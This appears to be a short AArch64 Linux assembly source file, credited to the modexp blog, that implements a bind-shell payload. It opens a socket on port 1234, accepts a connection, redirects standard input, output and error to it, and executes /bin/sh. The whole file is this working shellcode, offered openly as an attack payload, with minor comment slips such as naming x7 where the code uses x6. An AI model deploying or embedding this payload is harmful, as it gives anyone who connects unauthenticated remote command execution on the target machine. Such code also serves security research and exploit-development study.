/**
  bind shell to port 1234
  tested with linux running on ubuntu

  http://modexp.wordpress.com/   
*/

    .global _start
    .text

_start:
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    x2, x2, x2   // x2 = IPPROTO_IP
    mov    x1, #1       // x1 = SOCK_STREAM
    mov    x0, #2       // x0 = AF_INET
    mov    x8, #198     // x8 = socket
    svc    1
    
    mov    x6, x0       // x6 = s
    
    // bind(s, &sa, sizeof(sa));  
    mov    x2, #16      // x2 = sizeof(sa)
    adr    x1, sin_port // x1 = &sa
    mov    x8, #200     // x8 = bind
    svc    1
  
    // listen(s, 0);
    eor    x1, x1, x1   // x1 = 0    
    mov    x0, x6       // x0 = s
    mov    x8, #201     // x8 = listen 
    svc    1    
    
    // r = accept(s, 0, 0);
    eor    x1, x1, x1
    eor    x2, x2, x2
    mov    x0, x6        // x0 = s
    mov    x8, #202      // x8 = accept    
    svc    1    
    
    mov    x6, x0        // x7 = r
    
    // dup2(r, FILENO_STDIN);
    // dup2(r, FILENO_STDOUT);
    // dup2(r, FILENO_STDERR);
    mov    x1, #2        // for 3 descriptors
dup_loop:
    mov    x0, x6        // x0 = r
    mov    x8, #24       // x8 = dup2 
    svc    1
    subs   x1, x1, #1    // subtract one
    bpl    dup_loop

    // execve("/bin/sh", NULL, NULL);    
    eor    x1, x1, x1
    adr    x0, sh        // x0 = "/bin/sh" 
    mov    x8, #221      // x8 = execve
    svc    1
sin_port:    
    .word  0xd2040002
    .word  0x00000000 
sh:    
    .ascii "/bin/sh\0"

